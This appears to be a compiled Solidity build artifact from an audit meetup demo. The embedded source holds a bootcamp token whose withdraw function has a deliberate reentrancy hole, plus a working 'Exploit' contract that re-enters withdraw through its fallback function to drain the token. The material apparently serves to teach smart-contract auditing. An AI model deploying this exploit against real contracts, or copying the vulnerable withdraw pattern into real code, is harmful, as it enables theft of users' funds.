{
  "contractName": "balance",
  "abi": [
    {
      "constant": true,
      "inputs": [
        {
          "name": "_contract",
          "type": "address"
        }
      ],
      "name": "getBalance",
      "outputs": [
        {
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060e58061001f6000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063f8b2cb4f146044575b600080fd5b348015604f57600080fd5b506082600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506098565b6040518082815260200191505060405180910390f35b60008173ffffffffffffffffffffffffffffffffffffffff163190509190505600a165627a7a7230582082d2752bd2595b2d1584f487fff26ef546cca4b6609ab4a8e7231ed11c5fad260029",
  "source": "pragma solidity^0.4.0;\n\ncontract TestToken {\n    string constant name = \"IC3 2017 Bootcamp Token\";\n    string constant symbol = \"IC3\";\n    uint8 constant decimals = 18;\n    uint total;\n\n    struct Allowed {\n        mapping (address => uint256) _allowed;\n    }\n\n    mapping (address => Allowed) allowed;\n    mapping (address => uint256) balances;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n    function TestToken() {\n        total = 0;\n    }\n\n    function totalSupply() constant returns (uint256 totalSupply) {\n        return total;\n    }\n\n    function balanceOf(address _owner) constant returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    function deposit() payable returns (bool success) {\n        if (balances[msg.sender] + msg.value < msg.value) return false;\n        if (total + msg.value < msg.value) return false;\n        balances[msg.sender] += msg.value;\n        total += msg.value;\n        return true;\n    }\n\n    function withdraw(uint256 _value) payable returns (bool success) {\n        if (balances[msg.sender] < _value) return false;\n        msg.sender.call.value(_value)();\n        balances[msg.sender] -= _value;\n        total -= _value;\n        return true;\n    }\n\n    function transfer(address _to, uint256 _value) returns (bool success) {\n        if (balances[msg.sender] < _value) return false;\n\n        if (balances[_to] + _value < _value) return false;\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n\n        Transfer(msg.sender, _to, _value);\n\n        return true;\n    }\n\n\n    function approve(address _spender, uint256 _value) returns (bool success) {\n        allowed[msg.sender]._allowed[_spender] = _value;\n        Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n        return allowed[_owner]._allowed[_spender];\n    }\n\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n        if (balances[_from] < _value) return false;\n        if ( allowed[_from]._allowed[msg.sender] < _value) return false;\n        if (balances[_to] + _value < _value) return false;\n\n        balances[_from] -= _value;\n        balances[_to] += _value;\n        allowed[_from]._allowed[msg.sender] -= _value;\n        return true;\n    }\n\n}\n\ncontract Exploit {\n\n    TestToken public tokenContract;\n    uint public value;\n    uint public withdrawnX;\n    bool public deposited;\n\n    constructor (address _tokenAddress) public payable {\n        tokenContract  = TestToken(_tokenAddress);\n        value = this.balance;\n        deposited = tokenContract.deposit.value(value)();\n    }\n\n    function withdraw () public returns (bool) {\n        withdrawnX = 1;\n        return tokenContract.withdraw(value);\n    }\n\n    function () payable {\n        withdrawnX++;\n        if (msg.gas > 10000)\n            tokenContract.withdraw(value);\n    }\n    \n    function _balance() public view returns (uint) { \n        return this.balance; \n        \n    }\n}\n\ncontract balance {\n    function getBalance(address _contract) public view returns  (uint _balance) {\n        return address(_contract).balance;\n    }\n}\n\n",
  "sourcePath": "/Users/polaco/Prog/Audit/meetupBH/contracts/Contrato.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "2.0.2",
  "updatedAt": "2019-02-27T23:47:58.959Z"
}